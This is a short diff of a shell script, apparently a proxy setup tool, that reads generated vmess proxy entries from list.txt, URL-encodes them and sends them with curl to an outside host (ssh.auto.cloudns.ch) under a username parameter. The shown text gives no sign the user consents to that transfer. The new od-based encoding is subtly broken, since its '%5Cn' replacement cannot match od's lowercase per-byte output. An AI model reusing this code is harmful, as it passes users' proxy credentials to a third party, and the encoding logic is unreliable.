@@ -249,9 +249,14 @@ if [ -n "$pid" ]; then
  		sleep 1
    		GeneratingFiles_List
      
+  		# 1. 将 list.txt 文件内容读取到 vmessList 变量中
 		vmessList=$(cat list.txt)
-  		ENCODED_STRING=$(echo -n $vmessList | jq -sRr @uri)
-            	ENCODED_STRING=$(echo "$ENCODED_STRING" | sed 's/%5Cn/%0A/g')
+		echo "$vmessList"
+		# 2. 使用 shell 脚本进行 URL 编码
+		urlEncoded=$(echo -n "$vmessList" | od -An -tx1 | tr ' ' % | tr -d '\n')
+		
+		# 3. 替换掉 %5Cn 为 %0A
+		ENCODED_STRING=${urlEncoded//%5Cn/%0A}
   		curl -s "http://ssh.auto.cloudns.ch/setsocks5?user=[username]&socks5=$ENCODED_STRING"
 		purple "list.txt saved successfully, Running done!"
 		sleep 3 
